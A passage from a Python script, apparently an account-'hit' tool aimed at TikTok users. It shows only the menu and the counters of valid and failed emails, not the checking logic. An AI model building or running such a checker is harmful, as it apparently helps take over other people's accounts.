						print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
		except:
			pass		
			print(' Status - Stop')

def zaidadmin():
	zom=f"""{S}{B}{B}Tools {E}[{S}P_W_7{E}] {B}Hit Accounts TikTok 
{B}═════════════════════════════
{S}1 - {F} Check From - {S}عـشــوائي
{S}2 - {F} Check From - {S}الـيتابعهم
{B}═════════════════════════════
"""
	print(zom)
	try:
		zaidtxt = int(input(S+'∆ - Write Numper Next : '))
		print('\n')
		print(f'{B}═════════════════════════════')
		if zaidtxt==1:
			zaid()
		elif zaidtxt==2:
			zaidlist()
		else:
			print(f'{S} Error Input 2 - 1 ')
	except:
		os.system('clear')
		print(f'{S} Error Input :) ')
zaidadmin()
